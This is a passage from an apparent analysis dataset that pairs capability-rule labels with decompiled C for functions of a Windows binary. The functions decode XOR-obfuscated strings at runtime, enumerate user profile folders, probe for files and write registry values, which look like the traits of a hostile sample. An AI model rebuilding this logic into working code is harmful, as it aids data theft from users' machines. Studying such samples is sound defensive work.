            var_28h._1_1_ = 0x76;\n                var_28h._2_1_ = 0x61;\n                var_28h._3_1_ = 0x58;\n                var_24h = 0x74;\n                fcn.004012a0(0x18);\n                for (var_8h = 0; var_8h < 0xc; var_8h = var_8h + 1) {\n                    fcn.00401280(var_8h, *(&var_3ch + var_8h) ^ *(&var_28h + var_8h % 5));\n                }\n                var_20h = var_10h;\n                uVar1 = fcn.00401270(*0x436ba8, var_10h);\n                (*_sym.imp.USER32.dll_wsprintfW)(&ARG_0, uVar1);\n                var_10h = var_10h + 1;\n                var_2h._1_1_ = fcn.00413e80(&var_30h, var_1ch, var_ch, &ARG_0);\n                if (((var_2h._1_1_ != '\\0') && (var_2ch != NULL)) && (var_30h != 0)) {\n                    if (arg_8h[1] == 0) {\n                        uVar1 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, var_30h);\n                        iVar2 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar1);\n                        arg_8h[1] = iVar2;\n                    }\n                    else {\n                        uVar1 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, arg_8h[1], *arg_8h + var_30h);\n                        iVar2 = (*_sym.imp.KERNEL32.dll_HeapReAlloc)(uVar1);\n                        arg_8h[1] = iVar2;\n                    }\n                    puVar3 = var_2ch;\n                    puVar5 = arg_8h[1] + *arg_8h;\n                    for (iVar2 = var_30h; iVar2 != 0; iVar2 = iVar2 + -1) {\n                        *puVar5 = *puVar3;\n                        puVar3 = puVar3 + 1;\n                        puVar5 = puVar5 + 1;\n                    }\n                    *arg_8h = *arg_8h + var_30h;\n                    uVar1 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, var_2ch);\n                    (*_sym.imp.KERNEL32.dll_HeapFree)(uVar1);\n                }\n                fcn.004012d0();\n            } while (var_2h._1_1_ != '\\0');\n            (*_sym.imp.ADVAPI32.dll_RegCloseKey)(hKey);\n        }\n        uVar1 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, var_ch);\n        var_ch = (*_sym.imp.KERNEL32.dll_HeapFree)(uVar1);\n    }\n    if ((*arg_8h == 0) || (var_ch = arg_8h,  arg_8h[1] == 0)) {\n        var_2h._0_1_ = 0;\n    }\n    else {\n        var_2h._0_1_ = 1;\n    }\n    return var_ch & 0xffffff00 | var_2h;\n}\n",
        "token_count": 1530
    },
    "004144c0": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_2h\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __cdecl fcn.004144c0(int16_t *arg_8h)\n\n{\n    int32_t iVar1;\n    int16_t *piVar2;\n    uint var_48h;\n    uchar var_44h;\n    uchar var_43h;\n    uchar var_42h;\n    uchar var_41h;\n    uchar var_40h;\n    uchar var_3fh;\n    uchar var_3eh;\n    uchar var_3dh;\n    uchar var_3ch;\n    uchar var_3bh;\n    uchar var_3ah;\n    uchar var_39h;\n    uchar var_38h;\n    uchar var_37h;\n    uchar var_36h;\n    uchar var_35h;\n    uchar var_34h;\n    uchar var_33h;\n    uchar var_32h;\n    uchar var_31h;\n    uchar var_30h;\n    uchar var_2fh;\n    uchar var_2eh;\n    uchar var_2dh;\n    uchar var_2ch;\n    uchar var_2bh;\n    uchar var_2ah;\n    uchar var_29h;\n    uchar var_28h;\n    uchar var_27h;\n    uchar var_26h;\n    uchar var_25h;\n    uchar var_24h;\n    uchar var_23h;\n    uchar var_22h;\n    uchar var_21h;\n    uint8_t var_20h [4];\n    uchar var_1ch;\n    int16_t *var_18h;\n    uint var_14h;\n    int16_t *var_10h;\n    int16_t *var_ch;\n    int32_t var_8h;\n    uint var_2h;\n    \n    if (arg_8h != NULL) {\n        piVar2 = arg_8h;\n        for (iVar1 = 0x208; iVar1 != 0; iVar1 = iVar1 + -1) {\n            *piVar2 = 0;\n            piVar2 = piVar2 + 1;\n        }\n        var_48h._0_1_ = 0x36;\n        var_48h._1_1_ = 0x4d;\n        var_48h._2_1_ = 0xe;\n        var_48h._3_1_ = 0x31;\n        var_44h = 0x2a;\n        var_43h = 0x65;\n        var_42h = 0x39;\n        var_41h = 0x61;\n        var_40h = 0x46;\n        var_3fh = 0x4c;\n        var_3eh = 4;\n        var_3dh = 0x4d;\n        var_3ch = 0x13;\n        var_3bh = 0x31;\n        var_3ah = 0x29;\n        var_39h = 0x65;\n        var_38h = 0x11;\n        var_37h = 0x61;\n        var_36h = 0x70;\n        var_35h = 0x4c;\n        var_34h = 0x15;\n        var_33h = 0x4d;\n        var_32h = 0x11;\n        var_31h = 0x31;\n        var_30h = 8;\n        var_2fh = 0x65;\n        var_2eh = 0x2c;\n        var_2dh = 0x61;\n        var_2ch = 0x45;\n        var_2bh = 0x4c;\n        var_2ah = 4;\n        var_29h = 0x4d;\n        var_28h = 0x2d;\n        var_27h = 0x31;\n        var_26h = 0x23;\n        var_25h = 0x65;\n        var_24h = 0x3a;\n        var_23h = 0x61;\n        var_22h = 0x31;\n        var_21h = 0x4c;\n        var_20h[0] = 0x65;\n        var_20h[1] = 0x4d;\n        var_20h[2] = 0x61;\n        var_20h[3] = 0x31;\n        var_1ch = 0x4c;\n        fcn.004012a0(0x50);\n        for (var_8h = 0; var_8h < 0x28; var_8h = var_8h + 1) {\n            fcn.00401280(var_8h, *(&var_48h + var_8h) ^ var_20h[var_8h % 5]);\n        }\n        var_10h = fcn.00401270();\n        var_ch = arg_8h;\n        var_18h = arg_8h;\n        do {\n            var_2h._0_2_ = *var_10h;\n            *var_ch = var_2h;\n            var_10h = var_10h + 1;\n            var_ch = var_ch + 1;\n        } while (var_2h != 0);\n        fcn.004012d0();\n    }\n    return;\n}\n",
        "token_count": 1198
    },
    "00414640": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nbool __cdecl fcn.00414640(uint hKey, uint lpValueName, uint arg_10h, uint arg_14h)\n\n{\n    int32_t iVar1;\n    uint var_8h;\n    uint var_4h;\n    \n    iVar1 = (*_sym.imp.ADVAPI32.dll_RegSetValueExW)(hKey, lpValueName, 0, 3, arg_10h, arg_14h);\n    return iVar1 == 0;\n}\n",
        "token_count": 104
    },
    "00414690": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nuint fcn.00414690(void)\n\n{\n    char cVar1;\n    uint uVar2;\n    int32_t iVar3;\n    uint32_t uVar4;\n    uint *puVar5;\n    uchar *puVar6;\n    int16_t *piVar7;\n    uint *puVar8;\n    uint32_t lpFindFileData;\n    uint lpString1;\n    int16_t *var_144h;\n    uint var_140h;\n    uint var_13ch;\n    uint32_t var_138h;\n    uint *var_134h;\n    uint *var_130h;\n    uint var_12ch;\n    int16_t var_128h;\n    int16_t var_126h;\n    uint var_124h;\n    uint var_120h;\n    uint var_11ch;\n    uint var_118h;\n    uint var_114h;\n    uint var_110h;\n    int16_t *var_10ch;\n    uint var_108h;\n    uchar var_104h;\n    uchar var_103h;\n    uchar var_102h;\n    uchar var_101h;\n    uchar var_100h;\n    uchar var_ffh;\n    uchar var_feh;\n    uchar var_fdh;\n    uchar var_fch;\n    uchar var_fbh;\n    uchar var_fah;\n    uchar var_f9h;\n    uchar var_f8h;\n    uchar var_f7h;\n    uchar var_f6h;\n    uchar var_f5h;\n    uchar var_f4h;\n    uchar var_f3h;\n    uchar var_f2h;\n    uchar var_f1h;\n    uchar var_f0h;\n    uchar var_efh;\n    uchar var_eeh;\n    uchar var_edh;\n    uchar var_ech;\n    uchar var_ebh;\n    uchar var_eah;\n    uchar var_e9h;\n    uchar var_e8h;\n    uchar var_e7h;\n    uchar var_e6h;\n    uchar var_e5h;\n    uchar var_e4h;\n    uchar var_e3h;\n    uchar var_e2h;\n    uchar var_e1h;\n    uchar var_e0h;\n    uchar var_dfh;\n    uchar var_deh;\n    uchar var_ddh;\n    uchar var_dch;\n    uchar var_dbh;\n    uchar var_dah;\n    uchar var_d9h;\n    uint var_d8h;\n    uchar var_d4h;\n    uchar var_d3h;\n    uchar var_d2h;\n    uchar var_d1h;\n    uchar var_d0h;\n    uchar var_cfh;\n    uchar var_ceh;\n    uchar var_cdh;\n    uchar var_cch;\n    uchar var_cbh;\n    uchar var_cah;\n    uchar var_c9h;\n    uchar var_c8h;\n    uchar var_c7h;\n    uchar var_c6h;\n    uchar var_c5h;\n    uchar var_c4h;\n    uchar var_c3h;\n    uchar var_c2h;\n    uchar var_c1h;\n    uchar var_c0h;\n    uchar var_bfh;\n    uchar var_beh;\n    uchar var_bdh;\n    uchar var_bch;\n    uchar var_bbh;\n    uchar var_bah;\n    uchar var_b9h;\n    uchar var_b8h;\n    uchar var_b7h;\n    uchar var_b6h;\n    uchar var_b5h;\n    uchar var_b4h;\n    uchar var_b3h;\n    uchar var_b2h;\n    uchar var_b1h;\n    uint8_t var_b0h [4];\n    uchar var_ach;\n    uchar var_abh;\n    uchar var_aah;\n    uchar var_a9h;\n    uchar var_a8h;\n    uchar var_a7h;\n    uchar var_a6h;\n    uchar var_a5h;\n    uchar var_a4h;\n    uchar var_a3h;\n    uchar var_a2h;\n    uchar var_a1h;\n    uchar var_a0h;\n    uchar var_9fh;\n    uchar var_9eh;\n    uchar var_9dh;\n    uchar var_9ch;\n    uchar var_9bh;\n    uchar var_9ah;\n    uchar var_99h;\n    uchar var_98h;\n    uchar var_97h;\n    uchar var_96h;\n    uchar var_95h;\n    uchar var_94h;\n    uchar var_93h;\n    uchar var_92h;\n    uchar var_91h;\n    uchar var_90h;\n    uchar var_8fh;\n    uchar var_8eh;\n    uchar var_8dh;\n    uchar var_8ch;\n    uchar var_8bh;\n    uint var_88h;\n    uchar var_84h;\n    uchar var_83h;\n    uchar var_82h;\n    uchar var_81h;\n    uchar var_80h;\n    uchar var_7fh;\n    uint8_t var_7ch [4];\n    uchar var_78h;\n    uchar var_77h;\n    uint var_74h;\n    uchar var_70h;\n    uchar var_6fh;\n    uint var_6ch;\n    uchar var_68h;\n    uchar var_67h;\n    uint8_t var_64h [4];\n    uchar var_60h;\n    uint var_5ch;\n    uchar var_58h;\n    uint var_54h;\n    uchar var_50h;\n    uint var_4ch;\n    uchar var_48h;\n    uint var_44h;\n    uint *var_40h;\n    int16_t *var_3ch;\n    int32_t hFindFile;\n    uint32_t var_34h;\n    uint *var_30h;\n    int32_t var_2ah;\n    int32_t var_24h;\n    int32_t var_20h;\n    int32_t var_1ch;\n    int32_t var_18h;\n    int32_t var_14h;\n    uchar *ARG_0;\n    int16_t *lpFileName;\n    int16_t *lpProfileDir;\n    int32_t lpcchSize;\n    \n    var_12ch = 0;\n    lpProfileDir = NULL;\n    lpFileName = NULL;\n    ARG_0 = NULL;\n    lpcchSize = 0;\n    hFindFile = 0;\n    (*_sym.imp.USERENV.dll_GetProfilesDirectoryW)(0, &lpcchSize);\n    if (lpcchSize != 0) {\n        lpcchSize = lpcchSize + 10;\n        uVar2 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, lpcchSize * 2);\n        lpProfileDir = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar2);\n        uVar2 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, lpcchSize << 1);\n        lpFileName = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar2);\n        if (lpProfileDir != NULL) {\n            uVar2 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x208);\n            ARG_0 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar2);\n            puVar5 = &lpFindFileData;\n            for (iVar3 = 0x250; iVar3 != 0; iVar3 = iVar3 + -1) {\n                *puVar5 = 0;\n                puVar5 = puVar5 + 1;\n            }\n            puVar6 = ARG_0;\n            for (iVar3 = 0x208; iVar3 != 0; iVar3 = iVar3 + -1) {\n                *puVar6 = 0;\n                puVar6 = puVar6 + 1;\n            }\n            piVar7 = lpFileName;\n            for (iVar3 = lpcchSize << 1; iVar3 != 0; iVar3 = iVar3 + -1) {\n                *piVar7 = 0;\n                piVar7 = piVar7 + 1;\n            }\n            piVar7 = lpProfileDir;\n            for (iVar3 = lpcchSize << 1; iVar3 != 0; iVar3 = iVar3 + -1) {\n                *piVar7 = 0;\n                piVar7 = piVar7 + 1;\n            }\n            iVar3 = (*_sym.imp.USERENV.dll_GetProfilesDirectoryW)(lpProfileDir, &lpcchSize);\n            if (iVar3 != 0) {\n                var_10ch = lpProfileDir;\n                var_3ch = lpFileName;\n                var_144h = lpFileName;\n                do {\n                    var_2ah._0_2_ = *var_10ch;\n                    *var_3ch = var_2ah;\n                    var_10ch = var_10ch + 1;\n                    var_3ch = var_3ch + 1;\n                } while (var_2ah != 0);\n                var_88h._0_1_ = 0x38;\n                var_88h._1_1_ = 0x43;\n                var_88h._2_1_ = 99;\n                var_88h._3_1_ = 0x79;\n                var_84h = 0x5d;\n                var_83h = 100;\n                var_82h = 0x69;\n                var_81h = 0x49;\n                var_80h = 0x79;\n                var_7fh = 0x73;\n                var_4ch._0_1_ = 100;\n                var_4ch._1_1_ = 0x43;\n                var_4ch._2_1_ = 0x49;\n                var_4ch._3_1_ = 0x79;\n                var_48h = 0x73;\n                fcn.004012a0(0x14);\n                for (var_18h = 0; var_18h < 10; var_18h = var_18h + 1) {\n                    fcn.00401280(var_18h, *(&var_88h + var_18h) ^ *(&var_4ch + var_18h % 5));\n                }\n                var_134h = fcn.00401270();\n                var_30h = var_134h;\n                do {\n                    var_126h = *var_30h;\n                    var_30h = var_30h + 2;\n                } while (var_126h != 0);\n                var_138h = var_30h - var_134h;\n                var_40h = lpFileName + -1;\n                do {\n                    var_128h = *(var_40h + 2);\n                    var_40h = var_40h + 2;\n                } while (var_128h != 0);\n                puVar5 = var_134h;\n                puVar8 = var_40h;\n                for (uVar4 = var_138h >> 2; uVar4 != 0; uVar4 = uVar4 - 1) {\n                    *puVar8 = *puVar5;\n                    puVar5 = puVar5 + 1;\n                    puVar8 = puVar8 + 1;\n                }\n                for (uVar4 = var_138h & 3; uVar4 != 0; uVar4 = uVar4 - 1) {\n                    *puVar8 = *puVar5;\n                    puVar5 = puVar5 + 1;\n                    puVar8 = puVar8 + 1;\n                }\n                var_130h = var_134h;\n                hFindFile = (*_sym.imp.KERNEL32.dll_FindFirstFileW)(lpFileName, &lpFindFileData);\n                if (hFindFile != -1) {\n                    do {\n                        var_44h._0_1_ = 0x44;\n                        var_44h._1_1_ = 0x6d;\n                        var_44h._2_1_ = 0x78;\n                        var_44h._3_1_ = 0x67;\n                        var_54h._0_1_ = 0x6a;\n                        var_54h._1_1_ = 0x6d;\n                        var_54h._2_1_ = 0x78;\n                        var_54h._3_1_ = 0x67;\n                        var_50h = 0x39;\n                        fcn.004012a0(8);\n                        for (var_1ch = 0; var_1ch < 4; var_1ch = var_1ch + 1) {\n                            fcn.00401280(var_1ch, *(&var_44h + var_1ch) ^ *(&var_54h + var_1ch % 5));\n                        }\n                        var_6ch._0_1_ = 0x4a;\n                        var_6ch._1_1_ = 0x59;\n                        var_6ch._2_1_ = 0x5f;\n                        var_6ch._3_1_ = 0x4c;\n                        var_68h = 0x6a;\n                        var_67h = 0x38;\n                        var_74h._0_1_ = 100;\n                        var_74h._1_1_ = 0x59;\n                        var_74h._2_1_ = 0x71;\n                        var_74h._3_1_ = 0x4c;\n                        var_70h = 0x6a;\n                        var_6fh = 0x38;\n                        fcn.004012a0(0xc);\n                        for (var_20h = 0; var_20h < 6; var_20h = var_20h + 1) {\n                            fcn.00401280(var_20h, *(&var_6ch + var_20h) ^ *(&var_74h + var_20h % 6));\n                        }\n                        uVar2 = fcn.00401270();\n                        iVar3 = (*_sym.imp.KERNEL32.dll_lstrcmpW)(&lpString1, uVar2);\n                        if (iVar3 != 0) {\n                            uVar2 = fcn.00401270();\n                            iVar3 = (*_sym.imp.KERNEL32.dll_lstrcmpW)(&lpString1, uVar2);\n                            if ((iVar3 != 0) && ((lpFindFileData & 0x10) != 0)) {\n                                var_d8h._0_1_ = 6;\n                                var_d8h._1_1_ = 0x62;\n                                var_d8h._2_1_ = 0x3b;\n                                var_d8h._3_1_ = 0x6a;\n                                var_d4h = 4;\n                                var_d3h = 0x75;\n                                var_d2h = 0x2b;\n                                var_d1h = 0x62;\n                                var_d0h = 0x38;\n                                var_cfh = 0x6a;\n                                var_ceh = 0x47;\n                                var_cdh = 0x75;\n                                var_cch = 0x19;\n                                var_cbh = 0x62;\n                                var_cah = 0x31;\n                                var_c9h = 0x6a;\n                                var_c8h = 0x13;\n                                var_c7h = 0x75;\n                                var_c6h = 0x3e;\n                                var_c5h = 0x62;\n                                var_c4h = 0x3d;\n                                var_c3h = 0x6a;\n                                var_c2h = 9;\n                                var_c1h = 0x75;\n                                var_c0h = 0x2d;\n                                var_bfh = 0x62;\n                                var_beh = 0x27;\n                                var_bdh = 0x6a;\n                                var_bch = 0x3b;\n                                var_bbh = 0x75;\n                                var_bah = 0x1e;\n                                var_b9h = 0x62;\n                                var_b8h = 0x31;\n                                var_b7h = 0x6a;\n                                var_b6h = 10;\n                                var_b5h = 0x75;\n                                var_b4h = 0x3a;\n                                var_b3h = 0x62;\n                                var_b2h = 0x54;\n                                var_b1h = 0x6a;\n                                var_7ch[0] = 0x4a;\n                                var_7ch[1] = 0x62;\n                                var_7ch[2] = 0x54;\n                                var_7ch[3] = 0x6a;\n                                var_78h = 0x67;\n                                var_77h = 0x75;\n                                fcn.004012a0(0x50);\n                                for (var_14h = 0; var_14h < 0x28; var_14h = var_14h + 1) {\n                                    fcn.00401280(var_14h, *(&var_d8h + var_14h) ^ var_7ch[var_14h % 6]);\n                                }\n                                var_b0h[0] = 0x29;\n                                var_b0h[1] = 0x55;\n                                var_b0h[2] = 8;\n                                var_b0h[3] = 0x6f;\n                                var_ach = 5;\n                                var_abh = 0x68;\n                                var_aah = 0x11;\n                                var_a9h = 0x78;\n                                var_a8h = 0xe;\n                                var_a7h = 0x75;\n                                var_a6h = 0x1c;\n                                var_a5h = 0x55;\n                                var_a4h = 0x19;\n                                var_a3h = 0x6f;\n                                var_a2h = 0x29;\n                                var_a1h = 0x68;\n                                var_a0h = 0x19;\n                                var_9fh = 0x78;\n                                var_9eh = 0;\n                                var_9dh = 0x75;\n                                var_9ch = 0xb;\n                                var_9bh = 0x55;\n                                var_9ah = 0x19;\n                                var_99h = 0x6f;\n                                var_98h = 0x19;\n                                var_97h = 0x68;\n                                var_96h = 9;\n                                var_95h = 0x78;\n                                var_94h = 0x3b;\n                                var_93h = 0x75;\n                                var_92h = 0xd;\n                                var_91h = 0x55;\n                                var_90h = 0x15;\n                                var_8fh = 0x6f;\n                                var_8eh = 5;\n                                var_8dh = 0x68;\n                                var_8ch = 0x55;\n                                var_8bh = 0x78;\n                                var_5ch._0_1_ = 0x68;\n                                var_5ch._1_1_ = 0x55;\n                                var_5ch._2_1_ = 0x78;\n                                var_5ch._3_1_ = 0x6f;\n                                var_58h = 0x75;\n                                fcn.004012a0(0x4c);\n                                for (var_24h = 0; var_24h < 0x26; var_24h = var_24h + 1) {\n                                    fcn.00401280(var_24h, var_b0h[var_24h] ^ *(&var_5ch + var_24h % 5));\n                                }\n                                var_140h = fcn.00401270();\n                                var_13ch = fcn.00401270();\n                                for (var_34h = 0; var_34h < 2; var_34h = var_34h + 1) {\n                                    var_108h._0_1_ = 0x41;\n                                    var_108h._1_1_ = 0x71;\n                                    var_108h._2_1_ = 0x26;\n                                    var_108h._3_1_ = 0x44;\n                                    var_104h = 0x10;\n                                    var_103h = 100;\n                                    var_102h = 0x54;\n                                    var_101h = 0x55;\n                                    var_100h = 0x37;\n                                    var_ffh = 0x4c;\n                                    var_feh = 0x38;\n                                    var_fdh = 0x71;\n                                    var_fch = 0x70;\n                                    var_fbh = 0x44;\n                                    var_fah = 0x3f;\n                                    var_f9h = 100;\n                                    var_f8h = 0x2d;\n                                    var_f7h = 0x55;\n                                    var_f6h = 0x31;\n                                    var_f5h = 0x4c;\n                                    var_f4h = 0x15;\n                                    var_f3h = 0x71;\n                                    var_f2h = 0x3f;\n                                    var_f1h = 0x44;\n                                    var_f0h = 0x2f;\n                                    var_efh = 100;\n                                    var_eeh = 0x1a;\n                                    var_edh = 0x55;\n                                    var_ech = 0x21;\n                                    var_ebh = 0x4c;\n                                    var_eah = 3;\n                                    var_e9h = 0x71;\n                                    var_e8h = 0x20;\n                                    var_e7h = 0x44;\n                                    var_e6h = 0x24;\n                                    var_e5h = 100;\n                                    var_e4h = 0x1d;\n                                    var_e3h = 0x55;\n                                    var_e2h = 0x6a;\n                                    var_e1h = 0x4c;\n                                    var_e0h = 0x10;\n                                    var_dfh = 0x71;\n                                    var_deh = 0x38;\n                                    var_ddh = 0x44;\n                                    var_dch = 0x3c;\n                                    var_dbh = 100;\n                                    var_dah = 0x71;\n                                    var_d9h = 0x55;\n                                    var_64h[0] = 100;\n                                    var_64h[1] = 0x71;\n                                    var_64h[2] = 0x55;\n                                    var_64h[3] = 0x44;\n                                    var_60h = 0x4c;\n                                    fcn.004012a0(0x60);\n                                    for (stack0xffffffd4 = 0; stack0xffffffd4 < 0x30;\n                                        stack0xffffffd4 = stack0xffffffd4 + 1) {\n                                        fcn.00401280(stack0xffffffd4, \n                                                     *(&var_108h + stack0xffffffd4) ^ var_64h[stack0xffffffd4 % 5]);\n                                    }\n                                    uVar2 = fcn.00401270(lpProfileDir, &lpString1, (&var_140h)[var_34h]);\n                                    (*_sym.imp.USER32.dll_wsprintfW)(ARG_0, uVar2);\n                                    cVar1 = fcn.00415900(ARG_0);\n                                    if (cVar1 != '\\0') {\n                                        fcn.00416720(ARG_0);\n                                        var_12ch = 1;\n                                    }\n                                    fcn.004012d0();\n                                }\n                                fcn.004012d0();\n                                fcn.004012d0();\n                            }\n                        }\n                        fcn.004012d0();\n                        fcn.004012d0();\n                        iVar3 = (*_sym.imp.KERNEL32.dll_FindNextFileW)(hFindFile, &lpFindFileData);\n                    } while (iVar3 != 0);\n                }\n                (*_sym.imp.KERNEL32.dll_FindClose)(hFindFile);\n                fcn.004012d0();\n            }\n        }\n    }\n    if (lpFileName != NULL) {\n        uVar2 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, lpFileName);\n        (*_sym.imp.KERNEL32.dll_HeapFree)(uVar2);\n    }\n    if (lpProfileDir != NULL) {\n        uVar2 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, lpProfileDir);\n        (*_sym.imp.KERNEL32.dll_HeapFree)(uVar2);\n    }\n    if (ARG_0 != NULL) {\n        uVar2 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, ARG_0);\n        (*_sym.imp.KERNEL32.dll_HeapFree)(uVar2);\n    }\n    return var_12ch;\n}\n",
        "token_count": 5526
    },
    "00415150": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check if file exists/0479f02c3c8a4099bfdd7ca8c1e3802e/20122460e93841beb56e12792b6a4896"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid fcn.00415150(void)\n\n{\n    uint uVar1;\n    int32_t iVar2;\n    uint lpFindFileData;\n    uint var_324h;\n    uint var_100h;\n    uint var_fch;\n    uint lpcchSize;\n    uint var_f4h;\n    uint var_f0h;\n    uint var_ech;\n    uint ARG_0;\n    uint var_e4h;\n    uint var_e0h;\n    uint var_dch;\n    uchar var_d8h;\n    uchar var_d7h;\n    uchar var_d6h;\n    uchar var_d5h;\n    uchar var_d4h;\n    uchar var_d3h;\n    uchar var_d2h;\n    uchar var_d1h;\n    uchar var_d0h;\n    uchar var_cfh;\n    uchar var_ceh;\n    uchar var_cdh;\n    uchar var_cch;\n    uchar var_cbh;\n    uchar var_cah;\n    uchar var_c9h;\n    uchar var_c8h;\n    uchar var_c7h;\n    uchar var_c6h;\n    uchar var_c5h;\n    uchar var_c4h;\n    uchar var_c3h;\n    uchar var_c2h;\n    uchar var_c1h;\n    uchar var_c0h;\n    uchar var_bfh;\n    uchar var_beh;\n    uchar var_bdh;\n    uchar var_bch;\n    uchar var_bbh;\n    uchar var_bah;\n    uchar var_b9h;\n    uchar var_b8h;\n    uchar var_b7h;\n    uchar var_b6h;\n    uchar var_b5h;\n    uint8_t var_b4h [4];\n    uchar var_b0h;\n    uchar var_afh;\n    uchar var_aeh;\n    uchar var_adh;\n    uchar var_ach;\n    uchar var_abh;\n    uchar var_aah;\n    uchar var_a9h;\n    uchar var_a8h;\n    uchar var_a7h;\n    uchar var_a6h;\n    uchar var_a5h;\n    uchar var_a4h;\n    uchar var_a3h;\n    uchar var_a2h;\n    uchar var_a1h;\n    uchar var_a0h;\n    uchar var_9fh;\n    uchar var_9eh;\n    uchar var_9dh;\n    uchar var_9ch;\n    uchar var_9bh;\n    uchar var_9ah;\n    uchar var_99h;\n    uchar var_98h;\n    uchar var_97h;\n    uchar var_96h;\n    uchar var_95h;\n    uchar var_94h;\n    uchar var_93h;\n    uchar var_92h;\n    uchar var_91h;\n    uchar var_90h;\n    uchar var_8fh;\n    uint8_t var_8ch [4];\n    uchar var_88h;\n    uchar var_87h;\n    uchar var_86h;\n    uchar var_85h;\n    uchar var_84h;\n    uchar var_83h;\n    uchar var_82h;\n    uchar var_81h;\n    uchar var_80h;\n    uchar var_7fh;\n    uchar var_7eh;\n    uchar var_7dh;\n    uchar var_7ch;\n    uchar var_7bh;\n    uchar var_7ah;\n    uchar var_79h;\n    uchar var_78h;\n    uchar var_77h;\n    uchar var_76h;\n    uchar var_75h;\n    uchar var_74h;\n    uchar var_73h;\n    uchar var_72h;\n    uchar var_71h;\n    uchar var_70h;\n    uchar var_6fh;\n    uchar var_6eh;\n    uchar var_6dh;\n    uchar var_6ch;\n    uchar var_6bh;\n    uchar var_6ah;\n    uchar var_69h;\n    uint8_t var_68h [4];\n    uchar var_64h;\n    uchar var_63h;\n    uchar var_62h;\n    uchar var_61h;\n    uchar var_60h;\n    uchar var_5fh;\n    uchar var_5eh;\n    uchar var_5dh;\n    uchar var_5ch;\n    uchar var_5bh;\n    uchar var_5ah;\n    uchar var_59h;\n    uchar var_58h;\n    uchar var_57h;\n    uint var_54h;\n    uchar var_50h;\n    uchar var_4fh;\n    uint var_4ch;\n    uchar var_48h;\n    uchar var_47h;\n    uint var_44h;\n    uchar var_40h;\n    uchar var_3fh;\n    uint8_t var_3ch [4];\n    uchar var_38h;\n    uint var_34h;\n    uchar var_30h;\n    uint var_2ch;\n    uchar var_28h;\n    int32_t hFindFile;\n    uint32_t var_20h;\n    uint lpFileName;\n    int32_t var_18h;\n    int32_t var_14h;\n    int32_t var_10h;\n    int32_t var_ch;\n    int32_t var_8h;\n    uint lpProfileDir;\n    \n    uVar1 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x208);\n    lpProfileDir = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar1);\n    uVar1 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x208);\n    lpFileName = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar1);\n    uVar1 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x208);\n    ARG_0 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar1);\n    lpcchSize = 0x104;\n    var_dch._0_1_ = 6;\n    var_dch._1_1_ = 0x62;\n    var_dch._2_1_ = 0x3b;\n    var_dch._3_1_ = 0x6a;\n    var_d8h = 4;\n    var_d7h = 0x75;\n    var_d6h = 0x2b;\n    var_d5h = 0x62;\n    var_d4h = 0x38;\n    var_d3h = 0x6a;\n    var_d2h = 0x47;\n    var_d1h = 0x75;\n    var_d0h = 0x19;\n    var_cfh = 0x62;\n    var_ceh = 0x31;\n    var_cdh = 0x6a;\n    var_cch = 0x13;\n    var_cbh = 0x75;\n    var_cah = 0x3e;\n    var_c9h = 0x62;\n    var_c8h = 0x3d;\n    var_c7h = 0x6a;\n    var_c6h = 9;\n    var_c5h = 0x75;\n    var_c4h = 0x2d;\n    var_c3h = 0x62;\n    var_c2h = 0x27;\n    var_c1h = 0x6a;\n    var_c0h = 0x3b;\n    var_bfh = 0x75;\n    var_beh = 0x1e;\n    var_bdh = 0x62;\n    var_bch = 0x31;\n    var_bbh = 0x6a;\n    var_bah = 10;\n    var_b9h = 0x75;\n    var_b8h = 0x3a;\n    var_b7h = 0x62;\n    var_b6h = 0x54;\n    var_b5h = 0x6a;\n    var_44h._0_1_ = 0x4a;\n    var_44h._1_1_ = 0x62;\n    var_44h._2_1_ = 0x54;\n    var_44h._3_1_ = 0x6a;\n    var_40h = 0x67;\n    var_3fh = 0x75;\n    fcn.004012a0(0x50);\n    for (var_8h = 0; var_8h < 0x28; var_8h = var_8h + 1) {\n        fcn.00401280(var_8h, *(&var_dch + var_8h) ^ *(&var_44h + var_8h % 6));\n    }\n    var_b4h[0] = 0x29;\n    var_b4h[1] = 0x55;\n    var_b4h[2] = 8;\n    var_b4h[3] = 0x6f;\n    var_b0h = 5;\n    var_afh = 0x68;\n    var_aeh = 0x11;\n    var_adh = 0x78;\n    var_ach = 0xe;\n 